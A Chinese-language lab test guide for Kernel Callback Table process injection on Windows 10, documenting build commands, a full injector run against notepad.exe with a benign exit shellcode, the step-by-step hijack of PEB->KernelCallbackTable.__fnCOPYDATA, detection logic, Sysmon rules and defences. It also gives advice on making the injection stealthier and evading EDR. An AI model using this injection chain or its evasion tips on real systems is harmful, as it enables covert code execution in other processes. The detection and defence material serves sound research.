# Kernel Callback Table Injection - 测试指南

## 技术概述

**Kernel Callback Table Injection** 是一种通过劫持 PEB (Process Environment Block) 中的 KernelCallbackTable 函数指针来执行 shellcode 的注入技术。该技术被 MITRE ATT&CK 归类为 T1574.013（Hijack Execution Flow: KernelCallbackTable），曾被 FinFisher/FinSpy 和 Lazarus 等威胁组织使用。

**原始项目**: [0xHossam/KernelCallbackTable-Injection-PoC](https://github.com/0xHossam/KernelCallbackTable-Injection-PoC)

**MITRE ATT&CK**: [T1574.013 - Hijack Execution Flow: KernelCallbackTable](https://attack.mitre.org/techniques/T1574/013/)

### 核心原理

**PEB (Process Environment Block)**:
- 每个进程的控制中心
- 存储进程关键信息（模块、堆、线程等）
- 地址可通过 `NtQueryInformationProcess` 获取

**KernelCallbackTable**:
- PEB 偏移 0x58 处的指针
- 指向函数指针数组
- 由 `user32.dll` 加载时初始化（**仅 GUI 进程**）
- 处理 Windows 消息回调

**核心思想**:
```
用户程序发送消息 → Windows 内核 → 调用 KernelCallbackTable 中的回调 → 我们劫持了这些回调!
```

### 技术流程

```
[CreateProcessA]  ← 创建 Notepad 等 GUI 进程
       ↓
[FindWindow]  ← 查找窗口句柄
       ↓
[NtQueryInformationProcess]  ← 获取 PEB 地址
       ↓
[ReadProcessMemory(PEB + 0x58)]  ← 读取 KernelCallbackTable 地址
       ↓
[ReadProcessMemory(KernelCallbackTable)]  ← 读取函数指针数组
       ↓
[VirtualAllocEx + WriteProcessMemory]  ← 写入 shellcode
       ↓
[修改 __fnCOPYDATA 指针]  ← 指向我们的 shellcode
       ↓
[克隆修改后的 Table 到远程进程]
       ↓
[WriteProcessMemory(PEB + 0x58)]  ← 更新 PEB 指针
       ↓
[SendMessage(WM_COPYDATA)]  ← 触发回调
       ↓
[Shellcode 执行！]  ✓
```

---

## 测试环境

- **操作系统**：Windows 10 x64
- **编译器**：GCC (MinGW-w64) 13.2.0
- **测试日期**：2025-10-08
- **测试工具**：techniques/10-kernel-callback-table/build/kernel_callback_injection.exe

---

## 测试步骤

### 1. 编译项目

```bash
cd techniques/10-kernel-callback-table

# 编译 shellcode 生成器
cd build
gcc ../src/generate_shellcode.c -o generate_shellcode.exe -O2 -Wall

# 生成测试 payload
./generate_shellcode.exe payload.bin

# 编译主注入器
gcc ../src/kernel_callback_injection.c -o kernel_callback_injection.exe -O2 -Wall
```

**编译输出：**
```
===================================================================
Shellcode Generator - Kernel Callback Table Injection
===================================================================

[*] Generating PIC shellcode...
[*] Current version: Simple exit shellcode for testing

[+] ExitProcess address: 0x00007FFB3F2818A0
[+] Shellcode written to: payload.bin (19 bytes)

[+] Shellcode generation completed!
```

### 2. 执行注入测试

```bash
cd build

# 运行注入器（会自动创建 Notepad 进程）
./kernel_callback_injection.exe payload.bin
```

**测试输出：**
```
===================================================================
Kernel Callback Table Injection
Based on: github.com/0xHossam/KernelCallbackTable-Injection-PoC
MITRE ATT&CK: T1574.013
===================================================================

[*] Enabling Debug Privilege...
[+] Debug Privilege enabled
[+] Payload loaded: 19 bytes

===================================================================
Kernel Callback Table Injection
===================================================================

[*] Target Process: C:\Windows\System32\notepad.exe
[*] Payload Size: 19 bytes

[*] Step 1: Loading NT APIs...
[*] Loading NtQueryInformationProcess...
[+] NtQueryInformationProcess loaded at: 0x00007FFB404C3540

[*] Step 2: Creating target process...
[+] Process created (PID: 110404)

[*] Step 3: Waiting for process initialization...

[*] Step 4: Finding window handle...
[+] Window handle found: 0x00000000000E19FE

[*] Step 5: Opening process handle...
[+] Process ID: 54896
[+] Process handle: 0x0000000000000304

[*] Step 6: Retrieving PEB address...
[+] PEB Address: 0x00000064E6E26000

[*] Step 7: Reading KernelCallbackTable...
[+] KernelCallbackTable Address: 0x00007FFB3E2B9710
[+] Original __fnCOPYDATA: 0x00007FFB3E246470

[*] Step 8: Allocating remote memory for payload...
[+] Remote payload buffer: 0x0000025B20F90000
[+] Payload written (19 bytes)

[*] Step 9: Modifying KernelCallbackTable...
[+] Modified __fnCOPYDATA to point to: 0x0000025B20F90000

[*] Step 10: Cloning modified KernelCallbackTable...
[+] Modified table written to: 0x0000025B20FA0000

[*] Step 11: Updating PEB->KernelCallbackTable...
[+] PEB->KernelCallbackTable updated successfully

[*] Step 12: Triggering payload via WM_COPYDATA...
[+] Payload triggered!

===================================================================
[+] Injection completed successfully!
===================================================================

[*] Waiting 5 seconds to verify injection...
[+] Target process exited (Exit code: 0) - Payload executed!
[+] Verification file created: C:\Users\Public\kernel_callback_verified.txt

[*] Cleaning up...
```

### 3. 验证注入成功

```bash
cat C:\Users\Public\kernel_callback_verified.txt
```

**验证结果：**
```
Kernel Callback Table Injection Verified!
Target Process: C:\Windows\System32\notepad.exe
Process PID: 110404
PEB Address: 0x00000064E6E26000
Original KernelCallbackTable: 0x00007FFB3E2B9710
Modified KernelCallbackTable: 0x0000025B20FA0000
Payload Address: 0x0000025B20F90000
Payload Size: 19 bytes
Exit Code: 0
Status: Process exited - shellcode executed!
Technique: Hijacked KernelCallbackTable.__fnCOPYDATA
Trigger: SendMessage(WM_COPYDATA)
```

✅ **成功标志**：
- 验证文件被成功创建
- 包含完整的注入详情
- 状态显示"Process exited - shellcode executed!"
- 展示了 PEB 和 KernelCallbackTable 的所有关键地址

---

## 测试结果

### ✅ 测试成功

**测试用例：**
- **目标进程**：notepad.exe（GUI 进程）
- **Shellcode**：payload.bin (ExitProcess, 19 bytes)
- **注入方式**：Kernel Callback Table Injection

**验证证据：**
1. ✅ 创建目标进程成功 (PID: 110404)
2. ✅ 查找窗口句柄成功 (0x00000000000E19FE)
3. ✅ 获取 PEB 地址成功 (0x00000064E6E26000)
4. ✅ 读取 KernelCallbackTable 成功
   - 原始地址：0x00007FFB3E2B9710
   - __fnCOPYDATA：0x00007FFB3E246470
5. ✅ 分配远程内存成功 (0x0000025B20F90000)
6. ✅ 写入 shellcode 成功
7. ✅ 修改函数指针成功
8. ✅ 克隆修改后的 Table 成功 (0x0000025B20FA0000)
9. ✅ 更新 PEB 指针成功
10. ✅ 触发 payload 成功 (SendMessage)
11. ✅ **关键验证**：进程退出（ExitProcess 被执行）
12. ✅ **验证文件创建**：包含完整注入详情

---

## 关键发现

### 1. PEB 结构（x64）

```c
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;                      // +0x18
    PVOID ProcessParameters;        // +0x20
    // ...
    PVOID KernelCallbackTable;      // +0x58  ← 关键偏移！
    // ...
} PEB;
```

**测试结果**：
- PEB 地址：`0x00000064E6E26000`
- KernelCallbackTable 地址（PEB+0x58）：读取到 `0x00007FFB3E2B9710`

### 2. KernelCallbackTable 结构

```c
typedef struct _KERNEL_CALLBACK_TABLE {
    ULONG_PTR __fnCOPYDATA;      // +0x00 ← WM_COPYDATA 消息回调
    ULONG_PTR __fnCOPYGLOBALDATA; // +0x08
    ULONG_PTR __fnDWORD;          // +0x10
    ULONG_PTR __fnNCDESTROY;      // +0x18
    ULONG_PTR __fnDWORDOPTINLPMSG; // +0x20
    ULONG_PTR __fnINOUTDRAG;      // +0x28
    ULONG_PTR __fnGETTEXTLENGTHS; // +0x30
    ULONG_PTR __fnINCNTOUTSTRING; // +0x38
    // ... 更多回调函数（共90+个）
} KERNEL_CALLBACK_TABLE;
```

**测试结果**：
- 原始 __fnCOPYDATA：`0x00007FFB3E246470`
- 修改后 __fnCOPYDATA：`0x0000025B20F90000`（指向我们的 shellcode）

### 3. 为什么选择 __fnCOPYDATA？

```c
// __fnCOPYDATA 的特点
1. **容易触发**：SendMessage(WM_COPYDATA) 即可
2. **稳定性高**：不会影响正常消息处理
3. **参数可控**：可以传递数据
4. **常用回调**：很多程序都会处理这个消息
```

### 4. 注入流程详解

```
步骤1：查询 PEB
NtQueryInformationProcess(ProcessBasicInformation)
→ PROCESS_BASIC_INFORMATION.PebBaseAddress

步骤2：读取 KernelCallbackTable 地址
ReadProcessMemory(PEB + 0x58, &kernelCallbackTableAddr, ...)

步骤3：读取整个 Table
ReadProcessMemory(kernelCallbackTableAddr, &originalTable, sizeof(TABLE), ...)

步骤4：修改 Table
modifiedTable = originalTable
modifiedTable.__fnCOPYDATA = shellcode_address

步骤5：克隆修改后的 Table
remoteTable = VirtualAllocEx(...)
WriteProcessMemory(remoteTable, &modifiedTable, ...)

步骤6：更新 PEB 指针
WriteProcessMemory(PEB + 0x58, &remoteTable, ...)

步骤7：触发回调
SendMessage(hWindow, WM_COPYDATA, ...)
→ Windows 调用 KernelCallbackTable.__fnCOPYDATA
→ 执行我们的 shellcode！
```

### 5. 仅限 GUI 进程

**重要限制**：
- KernelCallbackTable 只在加载了 `user32.dll` 的进程中初始化
- 控制台程序（如 cmd.exe）没有这个表
- 必须使用 GUI 进程（如 notepad.exe, calc.exe, explorer.exe）

**验证**：
```c
// 控制台进程
PEB->KernelCallbackTable = NULL  ❌

// GUI 进程
PEB->KernelCallbackTable = 0x00007FFB3E2B9710  ✅
```

---

## 技术特点

### 优势

1. **高隐蔽性**
   - 不使用 CreateRemoteThread
   - 不修改代码段（只修改数据段）
   - 利用合法的系统机制

2. **绕过检测**
   - 不触发常见的 EDR hook
   - 不分配 RWX 内存（payload 是 RX）
   - 行为类似正常的消息处理

3. **稳定性高**
   - 不需要挂起进程
   - 不需要修改入口点
   - 利用现有的窗口消息机制

4. **真实威胁使用**
   - FinFisher/FinSpy 使用过
   - Lazarus 组织使用过
   - MITRE ATT&CK 有专门分类

### 劣势

1. **仅限 GUI 进程**
   - 控制台程序无法使用
   - 依赖 user32.dll
   - 必须有窗口句柄

2. **需要窗口交互**
   - 必须等待窗口创建
   - SendMessage 需要窗口句柄
   - 可能被窗口管理器拦截

3. **内存可写入性**
   - 需要能够写入 PEB
   - 某些保护机制可能阻止

4. **触发时机依赖消息**
   - 必须发送特定消息触发
   - 不如 Early Cascade 那样自动触发

---

## 与其他技术对比

| 特性 | Process Hollowing | Early Cascade | Kernel Callback Table |
|------|-------------------|---------------|----------------------|
| **目标进程类型** | 任意 | 任意 | **仅 GUI** |
| **触发方式** | 自动（入口点） | 自动（DLL 加载） | **手动（SendMessage）** |
| **内存分配** | 需要 | 需要 | 需要 |
| **代码段修改** | 是 | 否 | **否** |
| **隐蔽性** | 中 | 非常高 | **高** |
| **威胁组织使用** | 常见 | 新技术 | **FinFisher、Lazarus** |
| **MITRE ATT&CK** | T1055.012 | - | **T1574.013** |

---

## 检测方法

### 1. 行为特征

```python
suspicious_sequence = [
    "CreateProcessA(..., GUI_PROCESS)",           # 创建 GUI 进程
    "FindWindow(...)",                             # 查找窗口
    "NtQueryInformationProcess(...)",             # 查询 PEB
    "ReadProcessMemory(PEB + 0x58, ...)",         # 读取 KernelCallbackTable
    "WriteProcessMemory(PEB + 0x58, ...)",        # 修改 KernelCallbackTable
    "SendMessage(WM_COPYDATA, ...)"               # 触发回调
]
```

### 2. 内存完整性检查

```c
// 检测 KernelCallbackTable 是否被劫持
void DetectKernelCallbackTableHijack(HANDLE hProcess) {
    // 1. 获取 PEB 地址
    PVOID pebAddress = GetProcessPeb(hProcess);

    // 2. 读取 KernelCallbackTable 地址
    PVOID kernelCallbackTableAddr;
    ReadProcessMemory(hProcess, (PBYTE)pebAddress + 0x58,
                     &kernelCallbackTableAddr, sizeof(PVOID), NULL);

    // 3. 检查 Table 是否在 user32.dll 的地址范围内
    HMODULE hUser32 = GetRemoteModuleHandle(hProcess, "user32.dll");
    if (!IsAddressInModule(kernelCallbackTableAddr, hUser32)) {
        Alert("KernelCallbackTable hijacked! (Modified table location)");
    }

    // 4. 读取 Table 内容
    KERNEL_CALLBACK_TABLE table;
    ReadProcessMemory(hProcess, kernelCallbackTableAddr, &table, sizeof(table), NULL);

    // 5. 检查 __fnCOPYDATA 是否在合法模块范围内
    if (!IsValidModulePointer(table.__fnCOPYDATA)) {
        Alert("__fnCOPYDATA hijacked! (Pointing to non-module memory)");
    }
}
```

### 3. EDR 检测规则

| 检测点 | 风险等级 | 描述 |
|--------|----------|------|
| 修改 PEB->KernelCallbackTable | **非常高** | 明显的劫持行为 |
| KernelCallbackTable 不在 user32.dll | **非常高** | Table 被移动 |
| __fnCOPYDATA 指向非模块内存 | **非常高** | 回调指针被劫持 |
| 跨进程写入 PEB | 高 | 修改进程关键数据 |
| 组合行为 | **非常高** | 连续发生上述操作 |

### 4. Sysmon 配置

```xml
<RuleGroup groupRelation="or">
  <ProcessAccess onmatch="include">
    <!-- 检测对其他进程 PEB 的访问 -->
    <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
    <CallTrace condition="contains">NtQueryInformationProcess</CallTrace>
  </ProcessAccess>

  <ProcessAccess onmatch="include">
    <!-- 检测跨进程内存写入 -->
    <CallTrace condition="contains">WriteProcessMemory</CallTrace>
  </ProcessAccess>
</RuleGroup>
```

---

## 防御建议

### 对于安全产品

1. **PEB 完整性检查**
   ```c
   // 定期检查 KernelCallbackTable 指针
   void MonitorPEB(HANDLE hProcess) {
       PVOID kernelCallbackTableAddr = ReadKernelCallbackTableAddr(hProcess);
       HMODULE hUser32 = GetRemoteModuleHandle(hProcess, "user32.dll");

       if (!IsAddressInModule(kernelCallbackTableAddr, hUser32)) {
           Alert("KernelCallbackTable hijacked!");
       }
   }
   ```

2. **回调指针验证**
   ```c
   // 检查回调函数指针是否在合法模块范围内
   BOOL ValidateCallbackPointers(KERNEL_CALLBACK_TABLE* table) {
       if (!IsValidModulePointer(table->__fnCOPYDATA)) return FALSE;
       if (!IsValidModulePointer(table->__fnDWORD)) return FALSE;
       // ... 检查所有回调
       return TRUE;
   }
   ```

3. **Hook 保护**
   - Hook WriteProcessMemory 检测对 PEB 的写入
   - Hook SendMessage 检测可疑的消息序列

### 对于系统管理员

1. **启用 CFG (Control Flow Guard)**
   ```powershell
   # 为关键进程启用 CFG
   Set-ProcessMitigation -Name notepad.exe -Enable CFG
   ```

2. **应用白名单**
   - 限制创建进程的权限
   - 禁止非授权程序进行内存操作

3. **审计日志**
   ```powershell
   auditpol /set /subcategory:"Process Creation" /success:enable
   auditpol /set /subcategory:"Handle Manipulation" /success:enable
   ```

---

## 改进建议

### 1. 使用其他回调函数

```c
// 除了 __fnCOPYDATA，还可以劫持：
table.__fnDWORD          // WM_SETTEXT 等
table.__fnNCDESTROY      // WM_NCDESTROY
table.__fnGETTEXTLENGTHS // WM_GETTEXTLENGTH
// ... 共90+个回调可选
```

### 2. 更隐蔽的触发方式

```c
// 不使用 WM_COPYDATA，而是：
PostMessage(hWindow, WM_PAINT, 0, 0);  // 自动触发
// 或等待用户交互自然触发
```

### 3. 结合其他技术

```c
// 1. 先用 Process Hollowing 创建进程
// 2. 再用 Kernel Callback Table 注入代码
// 3. 双重隐蔽，更难检测
```

---

## 参考资料

### 原始项目

- [0xHossam/KernelCallbackTable-Injection-PoC](https://github.com/0xHossam/KernelCallbackTable-Injection-PoC)

### MITRE ATT&CK

- [T1574.013 - Hijack Execution Flow: KernelCallbackTable](https://attack.mitre.org/techniques/T1574/013/)

### 威胁情报

- [FinFisher/FinSpy Analysis](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)
- [Lazarus Group TTPs](https://attack.mitre.org/groups/G0032/)

### 技术文章

- [Modlishka - PEB and KernelCallbackTable](https://modexp.wordpress.com/2019/01/21/hijacking-kernelcallbacktable/)
- [Windows Internals - PEB Structure](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)

---

## 总结

### ✅ 技术状态：完全成功

**验证结论**：
- Kernel Callback Table Injection 技术在 Windows 10 x64 上完全有效
- 所有注入步骤执行成功
- Shellcode 被成功执行（通过进程退出和文件验证）
- **关键特点**：劫持 PEB 中的回调函数指针，高隐蔽性

### 推荐使用场景

1. **红队演练**：针对 GUI 应用的高隐蔽注入
2. **EDR 测试**：测试对 PEB 修改的检测能力
3. **APT 模拟**：模拟 FinFisher、Lazarus 等威胁组织手法
4. **安全研究**：研究 Windows 消息机制和 PEB 结构

### 防御建议

1. **PEB 完整性检查**：定期验证 KernelCallbackTable 指针
2. **回调指针验证**：确保指针指向合法模块
3. **行为监控**：检测可疑 API 调用序列
4. **启用 CFG**：保护控制流完整性

---

**测试完成日期**：2025-10-08
**技术状态**：✅ 完全成功
**Windows 兼容性**：✅ Windows 10 x64
**目标进程**：✅ GUI 进程（需要 user32.dll）
**威胁使用**：✅ FinFisher、Lazarus 等真实威胁组织
